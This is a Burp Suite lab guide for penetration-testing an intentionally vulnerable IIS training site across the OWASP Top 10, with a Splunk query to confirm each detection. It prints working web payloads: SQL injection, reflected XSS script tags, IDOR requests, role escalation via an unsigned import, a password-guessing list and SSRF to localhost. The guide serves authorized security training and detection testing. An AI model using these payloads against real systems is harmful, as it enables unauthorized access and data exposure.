# Burp Suite guide — HELPAG OWASP Top 10 lab

This guide is only for the isolated `HELPAG-VAPT-Test-Site` deployed in your
authorized lab. Do not aim these requests at a public or production system.

## 1. Lab layout and prerequisites

Recommended layout:

```text
Burp/VAPT workstation  --->  Windows IIS :8080  --->  Waitress :5005
                                      |
                                      +-- IIS W3C logs --> Splunk UF
                                      +-- JSON events --> Splunk UF or HEC
```

Before testing:

1. Deploy the site with `iis/Install-IIS-LabSite.ps1`.
2. Confirm `http://IIS_LAB_IP:8080/health` returns `lab_mode: true`.
3. Confirm both the tester and Splunk can reach the IIS server.
4. Add only the IIS hostname/IP and port to Burp's target scope.
5. Never add wildcard lab domains, production ranges, or Internet targets.
6. Create the Splunk `vapt_lab` index and configure the inputs in
   `splunk/README.md`.

Set a test identifier such as `BURP-20260913-01`. Add this header to every Burp
request so the corresponding event is easy to find:

```http
X-Lab-Test-ID: BURP-20260913-01
```

In Burp, use **Proxy > Match and replace** to add the header automatically, or
add it manually in Repeater.

## 2. Configure Burp

1. Start a temporary Burp project.
2. Use Burp's built-in browser, or proxy an external browser through
   `127.0.0.1:8080`.
3. Browse to `http://IIS_LAB_IP:8080`.
4. In **Target > Site map**, right-click the IIS host and choose **Add to scope**.
5. Select the option to stop logging out-of-scope traffic if offered.
6. Keep interception off while browsing normally; send interesting requests to
   Repeater with **Control-R**.

If Burp and IIS run on the same machine, change either Burp's listener port or
the IIS port so they do not both use 8080.

## 3. Establish a baseline

Send this request to Repeater:

```http
GET /health HTTP/1.1
Host: IIS_LAB_IP:8080
X-Lab-Test-ID: BURP-BASELINE-001
Connection: close
```

Expected response: HTTP 200 with `{"lab_mode":true,"status":"healthy"}`.

Splunk baseline:

```spl
index=vapt_lab test_id=BURP-BASELINE-001
| table _time source_ip method path status duration_ms user_agent test_id
```

## 4. A01 — Broken Access Control

Capture `GET /api/users/1`, send it to Repeater, and change the ID to `2`:

```http
GET /api/users/2 HTTP/1.1
Host: IIS_LAB_IP:8080
X-Lab-Test-ID: BURP-A01-001
Connection: close
```

Expected: another synthetic user's record is returned without a session or
authorization check. Record HTTP status, exposed fields, and both object IDs.

```spl
index=vapt_lab event_type=broken_access_attempt test_id=BURP-A01-001
| table _time source_ip object_id allowed path
```

## 5. A02 — Cryptographic Failures

```http
GET /api/backup HTTP/1.1
Host: IIS_LAB_IP:8080
X-Lab-Test-ID: BURP-A02-001
Connection: close
```

Expected: only synthetic lab secrets, an MD5 example, and missing transport
policy information are returned. Do not replace these with real credentials.

```spl
index=vapt_lab event_type=sensitive_data_exposure test_id=BURP-A02-001
| table _time source_ip artifact path
```

## 6. A03 — Injection

### SQL injection

Send a normal request first, then replace `Security` with the URL-encoded input
`%27%20OR%201%3D1--`:

```http
GET /api/products/search?q=%27%20OR%201%3D1-- HTTP/1.1
Host: IIS_LAB_IP:8080
X-Lab-Test-ID: BURP-A03-SQL-001
Connection: close
```

Expected: all three synthetic products are returned rather than a filtered
result. Compare it with `/api/products/search?q=Security`.

### Reflected XSS

```http
GET /reflect?name=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1
Host: IIS_LAB_IP:8080
X-Lab-Test-ID: BURP-A03-XSS-001
Connection: close
```

Use **Show response in browser** only for this lab response. Expected: the input
is inserted without output encoding.

```spl
index=vapt_lab test_id IN (BURP-A03-SQL-001,BURP-A03-XSS-001)
| table _time event_type query_input reflected_input suspicious source_ip
```

## 7. A04 — Insecure Design

```http
POST /api/checkout HTTP/1.1
Host: IIS_LAB_IP:8080
Content-Type: application/json
X-Lab-Test-ID: BURP-A04-001
Connection: close

{"quantity":-5,"unit_price":100}
```

Expected: the server accepts a negative total. Retest with a positive quantity
to document the control case.

```spl
index=vapt_lab event_type=business_logic_abuse test_id=BURP-A04-001
| table _time source_ip quantity unit_price total
```

## 8. A05 — Security Misconfiguration

```http
GET /api/debug/config HTTP/1.1
Host: IIS_LAB_IP:8080
X-Lab-Test-ID: BURP-A05-001
Connection: close
```

Expected: a synthetic debug configuration is disclosed.

```spl
index=vapt_lab event_type=debug_endpoint_access test_id=BURP-A05-001
```

## 9. A06 — Vulnerable and Outdated Components

```http
GET /api/components HTTP/1.1
Host: IIS_LAB_IP:8080
X-Lab-Test-ID: BURP-A06-001
Connection: close
```

Expected: simulated component names and versions. They are not actually
installed and must not be used as proof of a host vulnerability.

```spl
index=vapt_lab event_type=outdated_component_inventory test_id=BURP-A06-001
```

## 10. A07 — Authentication Failures with Intruder

Send the login request to Intruder:

```http
POST /api/login HTTP/1.1
Host: IIS_LAB_IP:8080
Content-Type: application/json
X-Lab-Test-ID: BURP-A07-001
Connection: close

{"username":"admin","password":"§candidate§"}
```

Use a **Sniper** attack with this small lab-only payload list:

```text
wrong
Password1
admin123
admin
```

Use one thread and no more than one request per second. Add a response grep item
for `"authenticated":true`. Expected: there is no lockout and `admin` succeeds.

```spl
index=vapt_lab event_type=authentication_attempt test_id=BURP-A07-001
| stats count count(eval(success=false)) as failures count(eval(success=true)) as successes by source_ip username
```

## 11. A08 — Software and Data Integrity Failures

```http
POST /api/preferences/import HTTP/1.1
Host: IIS_LAB_IP:8080
Content-Type: application/json
X-Lab-Test-ID: BURP-A08-001
Connection: close

{"theme":"dark","role":"admin"}
```

Expected: the unsigned role is accepted.

```spl
index=vapt_lab event_type=unsigned_data_import test_id=BURP-A08-001
| table _time source_ip imported_role signature_checked
```

## 12. A09 — Logging and Monitoring Failures

```http
POST /api/quiet-transfer HTTP/1.1
Host: IIS_LAB_IP:8080
Content-Type: application/json
X-Lab-Test-ID: BURP-A09-001
Connection: close

{"amount":9999}
```

Expected: the action succeeds, but its intentionally incomplete audit event has
no actor or destination.

```spl
index=vapt_lab event_type=monitoring_gap_simulated test_id=BURP-A09-001
| table _time amount actor destination source_ip
```

## 13. A10 — Bounded SSRF

For IIS/Waitress on the same Windows host:

```http
GET /api/fetch?url=http%3A%2F%2F127.0.0.1%3A5005%2Fhealth HTTP/1.1
Host: IIS_LAB_IP:8080
X-Lab-Test-ID: BURP-A10-001
Connection: close
```

Expected: the server fetches its localhost-only backend health endpoint. Public
or arbitrary destinations return HTTP 403 because this training build bounds
SSRF to lab-local names.

```spl
index=vapt_lab event_type=ssrf_probe test_id=BURP-A10-001
| table _time source_ip target allowed severity
```

## 14. Burp automated scanning

With Burp Professional, right-click only the scoped IIS host and choose **Scan**.
Use a crawl/audit configuration that excludes denial-of-service checks and keep
concurrency low. Burp Community users can crawl manually, review passive issues,
and execute the Repeater/Intruder procedures above.

Do not treat automated scanner output as confirmed. Reproduce each candidate in
Repeater and retain the exact request and response.

## 15. Evidence and final acceptance

For every case capture:

- Test ID, date/time, tester, source workstation, target URL, and authorization.
- Burp request and response export.
- Screenshot showing the relevant response behavior.
- Corresponding application event and IIS access event in Splunk.
- Impact, expected remediation, retest outcome, and false-positive notes.

Final coverage query:

```spl
index=vapt_lab test_id="BURP-*" earliest=-24h
| stats count values(path) as paths values(status) as statuses by test_id event_type
| sort test_id event_type
```

Pass criteria: all planned requests have matching IIS and application telemetry,
all OWASP event types are searchable, and every finding is reproducible in Burp
Repeater. A missing event is a telemetry failure even when the vulnerable
behavior itself is reproduced.

